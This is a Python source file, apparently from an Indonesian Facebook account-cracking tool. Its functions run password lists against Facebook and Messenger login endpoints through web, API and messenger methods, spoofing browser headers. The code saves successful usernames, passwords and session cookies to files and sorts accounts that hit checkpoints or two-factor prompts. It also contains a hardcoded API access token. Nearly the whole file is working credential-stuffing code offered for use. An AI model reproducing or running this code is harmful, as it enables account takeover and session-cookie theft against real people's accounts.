				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE ASYNC ]-----###
def rr075(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			versi = re.search('Chrome/(\d+).', str(ua)).group(1)
			versi2 = f".0.{str(rr(1111,5999))}.{str(rr(45,150))}"
			link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"pass": pw,"fb_dtsg":"","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			headers = {"Host": "m.facebook.com","content-length": "2138","sec-ch-ua": '"Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="%s"'%(versi),"sec-ch-ua-mobile": "?1","user-agent": ua,"viewport-width": "421","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"sec-ch-ua-platform-version": '"10.0.0"',"x-asbd-id": "129477","dpr": "2.56875","sec-ch-ua-full-version-list": '"Not/A)Brand";v="99.0.0.0", "Samsung Internet";v="23.0.0.47", "Chromium";v="%s%s"'%(versi,versi2),"sec-ch-ua-model": '"Redmi Note 7"',"sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ses.post("https://m.facebook.com/login/device-based/login/async/?api_key=190291501407&auth_token=563a4d0ad69493ce0947d19e95df8085&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&refsrc=deprecated&app_id=190291501407&cancel=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&lwv=100",data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE API ]-----###
def rr076(uid,pwx):
	global loop,ok,cp,a2f
	sys.stdout.write(f"\r[{bo}RR07 v6{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = api()
			headers = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif 'Login approvals' in response.json()['error_msg']:
				a2f+=1
				print(f"\r{P}  - {M}{uid}|{pw} ---> A2F{P}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE MESSENGER ]-----###
def rr077(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":uid,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pwx:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				ok +=1
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
#--------------------[ METODE-MOBILE ]-----------------#
def rr078(uid,pwx):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r[{bo}RR07 v8{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
	ua = random.choice(ugen)
	get = geturlm()
	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
	post = posturlm()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwx:
		try:
			link = ses.get(get)
			data = {
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
    "unrecognized_tries": re.search(
        'name="unrecognized_tries" value="(.*?)"', str(link.text)
    ).group(1),
    "email": uid,
    "prefill_contact_point": "",
    "prefill_source": "",
    "prefill_type": "",
    "first_prefill_source": "",
    "first_prefill_type": "",
    "had_cp_prefilled": "true",
    "had_password_prefilled": "false",
    "is_smart_lock": "false",
    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
    "encpass": "#PWD_BROWSER:0:{}:{}".format(
        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
    ),
    "fb_dtsg": "",
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "__dyn": "",
    "__csr": "",
    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
    "__a": "",
    "__user": 0,
}

			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
    "Host": url,
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
    "dpr": f"{str(rr(1,5))}",
    "origin": f"https://"+url,
    "referer": get,
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": '""',
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": ua,
    "viewport-width": f"{str(rr(300,999))}",
    "x-asbd-id": "129477",
    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "x-requested-with": bro,
    "x-response-format": "JSONStream",
}
			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('CP/'+cpc,'a').write(uid+'|'+pw+'\n')
				akun.append(username+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('OK/'+okc,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["free.facebook.com"])
	head = {"Host": url,
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"x-requested-with": "com.android.chrome",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
		#cp+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CYXIEON-OK')
	except:pass
	try:os.mkdir('CYXIEON-CP')
	except:pass
	awal()
	
	
#>>>>> THANKS TO <<<<<#

#    *--> BASARI ID
#    *--> ALVINO ADIJAYA
#    *--> AOREC-XD

#>>>>> THANKS TO <<<<<#